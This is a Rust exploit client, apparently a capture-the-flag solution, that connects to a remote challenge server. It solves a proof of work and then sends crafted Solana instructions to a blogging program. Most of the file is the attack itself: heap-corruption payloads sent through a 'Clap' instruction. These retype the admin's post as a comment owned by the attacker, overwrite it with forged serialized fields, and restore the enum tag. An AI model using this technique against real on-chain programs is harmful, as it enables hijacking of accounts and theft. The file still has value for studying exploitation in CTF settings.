use std::{error::Error, io::{BufRead, BufReader, Read, Write}, net::TcpStream, str::FromStr};

use solana_program::{instruction::{AccountMeta, Instruction}};
use solana_sdk::{exit, pubkey};
use sha2::Sha256;
use sha2::Digest;
use borsh::{to_vec, BorshDeserialize, BorshSerialize};
use solana_program::pubkey::Pubkey;

pub const MAX_COLLABORATORS: usize = 3;


#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub enum HeapCommand {
    Allocate {
        size: u64,
    },
    Edit {
        index: u64,
        data: Vec<u8>,
        resize: bool,
    },
    Search {
        index: u64,
    }
}

#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub struct HeapKit {
    pub commands: Vec<HeapCommand>
}

#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub struct Post {
    pub claps: u8,
    pub comment_count: u8,

    pub collaborators: [Pubkey; MAX_COLLABORATORS],
    pub collaborator_count: u8,

    pub author: Pubkey,
    pub title: Vec<u8>,
    pub content: Vec<u8>,
}

#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub struct Comment {
    pub claps: u8,
    pub order: u8,
    pub author: Pubkey,
    pub content: Vec<u8>,
}

#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub enum SologData {
    Post(Post),
    Comment(Comment),
}

#[derive(Debug, BorshSerialize, BorshDeserialize)]
pub enum SologInstruction {
    /// Create a new post
    /// accounts:
    ///  0. author
    ///  1. post pda
    ///  2. system_program
    CreatePost { title: Vec<u8>, content: Vec<u8> },

    /// Add a collaborator to a post
    /// accounts:
    ///  0. author
    ///  1. collaborator
    ///  2. post pda
    AddCollaborator,

    /// Clap for a post
    /// accounts:
    ///  0. viewer
    ///  1. post or comment pda
    ///  2. system_program
    Clap { data: Vec<u8> },

    /// Comment on a post
    /// accounts:
    ///  0. author
    ///  1. post pda
    ///  2. comment pda
    ///  3. system_program
    AddComment { content: Vec<u8> },

    /// Edit a comment
    /// accounts:
    /// 0. author
    /// 1. comment pda
    /// 2. system_program
    EditComment { content: Vec<u8> },
}

pub struct ProofOfWork {
    pub prefix: String,
}

impl ProofOfWork {
    const DIFFICULTY: usize = 5;

    fn from(prefix: String) -> Self {
        Self { prefix }
    }

    fn calculate(&self) -> String {
        let mut nonce = 0_u128;
        loop {
            let mut hasher = Sha256::new();
            hasher.update(format!("{}{}", self.prefix, nonce));
            let result = hasher.finalize();
            let hex_result = format!("{:x}", result);

            if hex_result.starts_with(&"0".repeat(Self::DIFFICULTY)) {
                return nonce.to_string();
            }
            nonce += 1;
        }
    }

}

fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
    let mut line = String::new();
    reader.read_line(&mut line)?;

    println!("{}", line);

    let ret = line
        .split(':')
        .nth(1)
        .ok_or("invalid input")?
        .trim()
        .to_string();

    Ok(ret)
}

fn main() -> Result<(), Box<dyn Error>> {

    let local = "127.0.0.1:1337";
    let remote = "1.95.6.230:1337";

    let mut stream = TcpStream::connect(remote)?;
    let mut reader = BufReader::new(stream.try_clone()?);

    // solve proof of work
    println!("Solving proof of work...");
    let prefix = get_line(&mut reader)?;
    let pow = ProofOfWork::from(prefix);
    let nonce = pow.calculate();
    writeln!(stream, "nonce: {}", nonce)?;


    let program_id = pubkey!("so1og11111111111111111111111111111111111111");
    let user = Pubkey::from_str(&get_line(&mut reader)?)?;
    let post = Pubkey::from_str(&get_line(&mut reader)?)?;

    println!("user: {:?}", user);
    println!("post: {:?}", post);

    let mut instructions = Vec::new();
    
    // --------------------------------
    // your solution here
    // Don't forget to push your instruction to `instructions`

    // // add comment
    // let content = "hacker".as_bytes().to_vec();
    // let instruction = SologInstruction::AddComment {
    //     content,
    // };
    // let (comment, _) = Pubkey::find_program_address(
    //     &[
    //         b"comment",
    //         &post.to_bytes()[..16],
    //         &user.to_bytes()[..16],
    //         &0_u8.to_le_bytes(),
    //     ],
    //     &program_id,
    // );
    // let add_comment_ix = Instruction {
    //     program_id,
    //     accounts: vec![
    //         AccountMeta::new(user, true),
    //         AccountMeta::new(post, false),
    //         AccountMeta::new(comment, false),
    //         AccountMeta::new_readonly(solana_program::system_program::id(), false),
    //     ],
    //     data: to_vec(&instruction).unwrap(),
    // };
    // instructions.push(add_comment_ix);

    // change admin post to comment type
    let comment_data = Comment {
        claps: 0, 
        order: 0,
        author: user,
        content: vec![],
    };
    let comment_data = to_vec(&SologData::Comment(comment_data)).unwrap();
    let mut data = vec![0x41_u8; 29];
    data.extend_from_slice(&vec![0xc0 - 8, 0x28, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00]);

    let heapkit = HeapKit {
        commands: vec![
            // HeapCommand::Allocate { size: 0x100 },
            // HeapCommand::Search { index: 10 },
            HeapCommand::Edit {
                index: 10,
                data,
                resize: true
            },
            HeapCommand::Search { index: 10 },
            // HeapCommand::Search { index: 11 },
            HeapCommand::Edit {
                index: 11,
                data: comment_data,
                resize: true
            },
            HeapCommand::Search { index: 11 },
        ]
    };
    let clap = SologInstruction::Clap { data: to_vec(&heapkit).unwrap() };
    let change_post_to_comment_ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(user, true),
            AccountMeta::new(post, false),
            AccountMeta::new_readonly(solana_program::system_program::id(), false),
        ],
        data: to_vec(&clap).unwrap(),
    };
    instructions.push(change_post_to_comment_ix);

    // edit fake comment
    let mut fake_content = vec![0xff_u8; 32 + 32 - 4];

    fake_content.extend_from_slice(&[0x03_u8]);

    fake_content.extend_from_slice(&user.to_bytes());

    let len = 0x1_u32.to_le_bytes();
    fake_content.extend_from_slice(&len);
    fake_content.extend_from_slice("b".repeat(1).as_bytes());
    fake_content.extend_from_slice(&len);
    fake_content.extend_from_slice("c".repeat(1).as_bytes());
    let edit_post = SologInstruction::EditComment {
        content: fake_content,
    };
    let edit_post_ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(user, true),
            AccountMeta::new(post, false),
            AccountMeta::new_readonly(solana_program::system_program::id(), false),
        ],
        data: to_vec(&edit_post).unwrap(),
    };
    instructions.push(edit_post_ix);

    // recover enum
    let prepare = vec![0x00_u8];
    let mut recover_data = prepare.clone();
    recover_data.extend_from_slice(&vec![0xc0 - 8, 0x28, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00]);
    let heapkit = HeapKit {
        commands: vec![
            // HeapCommand::Allocate { size: 0x100 },
            HeapCommand::Search { index: 12 },
            HeapCommand::Edit {
                index: 12,
                data: recover_data,
                resize: true
            },
            // HeapCommand::Search { index: 10 },
            // HeapCommand::Search { index: 11 },
            HeapCommand::Search { index: 13 },
            HeapCommand::Edit {
                index: 13,
                data: prepare,
                resize: false
            },
        ]
    };
    let clap = SologInstruction::Clap { data: to_vec(&heapkit).unwrap() };
    let change_post_to_comment_ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(user, true),
            AccountMeta::new(post, false),
            AccountMeta::new_readonly(solana_program::system_program::id(), false),
        ],
        data: to_vec(&clap).unwrap(),
    };
    instructions.push(change_post_to_comment_ix);

    // --------------------------------
    // you don't need to modify code blow
    
    let send_data = serde_json::to_vec(&instructions)?;
    let len = send_data.len() as u64;
    stream.write_all(&len.to_le_bytes())?;
    stream.write_all(&send_data)?;

    let mut response = Vec::<u8>::new();
    stream.read_to_end(&mut response)?;
    let response = String::from_utf8(response)?;
    println!("{}", response);
    Ok(())
}
